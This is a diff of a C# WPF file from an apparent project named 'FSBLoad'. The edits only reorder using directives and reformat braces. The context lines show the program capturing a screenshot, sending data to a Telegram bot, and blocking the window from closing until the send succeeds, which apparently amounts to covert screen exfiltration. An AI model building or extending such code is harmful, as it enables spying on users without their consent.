@@ -1,24 +1,10 @@
 ﻿using System;
-using System.Collections.Generic;
-using System.Linq;
-using System.Text;
-using System.Threading.Tasks;
-using System.Threading;
-using System.Windows;
-using System.Windows.Controls;
-using System.IO;
-using System.Windows.Data;
-using System.Management;
-using System.Runtime.InteropServices;
-using System.Windows.Documents;
-using System.Windows.Input;
-using System.Windows.Media;
-using System.Windows.Media.Imaging;
-using System.Windows.Forms;
-using System.Windows.Navigation;
 using System.Drawing;
-using System.Windows.Shapes;
-using System.Net.Http;
+using System.IO;
+using System.Management;
+using System.Threading.Tasks;
+using System.Windows;
+using System.Windows.Forms;
 using Telegram.Bot;
 
 namespace FSBLoad
@@ -53,7 +39,8 @@ namespace FSBLoad
 
 				ItHasBeenSent = true;
 
-			} catch(Exception ex)
+			}
+			catch (Exception ex)
 			{
 				System.Windows.MessageBox.Show(ex.Message, "Телега сдохла");
 			}
@@ -61,7 +48,7 @@ namespace FSBLoad
 
 		private void Window_Closing(object sender, System.ComponentModel.CancelEventArgs e)
 		{
-			if(!ItHasBeenSent)
+			if (!ItHasBeenSent)
 				e.Cancel = true;
 		}
 
@@ -83,7 +70,8 @@ namespace FSBLoad
 				printscreen.Save(ms, System.Drawing.Imaging.ImageFormat.Png);
 				return ms.ToArray();
 
-			} catch (Exception ex)
+			}
+			catch (Exception ex)
 			{
 				System.Windows.MessageBox.Show(ex.Message, "Проблема со скрином");
 				return null;
